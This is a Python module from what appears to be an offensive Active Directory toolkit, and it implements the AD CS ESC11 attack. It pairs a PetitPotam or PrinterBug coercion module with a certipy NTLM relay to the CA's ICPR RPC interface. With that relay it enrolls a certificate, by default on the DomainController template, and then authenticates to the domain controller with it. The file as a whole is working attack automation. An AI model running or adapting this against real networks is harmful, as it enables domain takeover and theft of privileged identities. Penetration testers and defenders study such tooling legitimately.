import asyncio
import os

from module import BaseModule
from tool import Tool
from modules.coercion_petitpotam import PetitPotam
from modules.coercion_printerbug import PrinterBug

class ADCSESC11(BaseModule):
    name = "ADCS - ESC11"
    path = "adcs/esc11"
    description = "ESC11: NTLM Relay to AD CS RPC Interface"

    info = """The ICertPassage (ICPR) RPC interface used for smart card enrollment is vulnerable to NTLM relay attacks. An attacker can relay authentication to this service to enroll for a certificate on behalf of the relayed user.

Prerequisites:
  - The ICPR service is enabled on the CA.
  - The attacker can coerce authentication from a user and relay it to the ICPR RPC interface."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address.", "required": True},
        "template": {"default": "DomainController", "description": "ESC8 vulnerable template", "required": True},
        "coercer": {"default": "petitpotam", "description": "Coercion technique (petitpotam, printerbug)", "required": True},
    }

    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)
        self.coercers = {"petitpotam": PetitPotam, "printerbug": PrinterBug}
        coercer, _ = self.get_option_value("coercer")
        self.set_option("coercer", coercer)

    def set_option(self, option_name: str, value: str, is_bool: bool=False) -> bool:
        if option_name == "coercer":
            if value.lower() not in self.coercers:
                value = "petitpotam" # default
            self.paired_module = self.coercers[value.lower()](self.registry, self.job_manager)

        if option_name in self.paired_module.options:
            self.paired_module.set_option(option_name, value, is_bool)

        return super().set_option(option_name, value, is_bool)

    def unset_option(self, option_name: str) -> bool:
        if option_name in self.paired_module.options:
            self.paired_module.unset_option(option_name)
        return super().unset_option(option_name)

    async def _run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename("esc11")

        tool.title("Run relay to AD CS RPC")
        if not await tool.certipy_relay(['-target', f"rpc://{self.opts.ca_host}", '-template', self.opts.template, '-out', pfx, '-ca', self.opts.ca_host]):
            return

        tool.title("Authenticate to the DC with the obtained certificate.")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return
 
        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")

    async def run(self):
        self.paired_module.pane_a = self.pane_a
        self.paired_module.pane_b = self.pane_b
        self.paired_module.pane_c = self.pane_c
        
        if self.validate_options() and self.paired_module.validate_options():
            await asyncio.gather(
                self._run(),
                self.paired_module.run()
            )
